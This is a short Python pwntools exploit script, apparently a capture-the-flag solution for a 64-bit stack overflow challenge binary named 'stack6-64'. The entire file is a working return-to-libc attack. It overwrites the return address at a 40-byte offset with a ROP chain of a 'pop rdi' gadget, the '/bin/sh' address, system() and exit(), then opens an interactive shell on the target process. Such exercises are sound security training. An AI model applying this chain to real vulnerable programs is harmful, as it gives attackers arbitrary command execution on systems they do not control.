from pwn import *
import sys

offset_ret = 40

exit_addr = 0x7ffff7a25110
system_addr = 0x7ffff7a31420
binsh_addr = 0x7ffff7b95d88
gadget_one = 0x0000004006f3 #pop rdi; ret
gadget_two = 0x0000004004ce #ret

exploit_str = flat({offset_ret:p64(gadget_one)},
       p64(binsh_addr), p64(gadget_two) ,p64(system_addr),p64(exit_addr))

#exploit_str = 'a'*offset_ret + p64(gadget_one) + p64(binsh_addr) + p64(system_addr) + p64(exit_addr)
#sys.stdout.write(exploit_str)



p = process("/problems/stack6r-64_4_71c8dd3af558e167e0dba9b57bf90f7a/stack6-64")
p.sendline(exploit_str)
p.interactive()

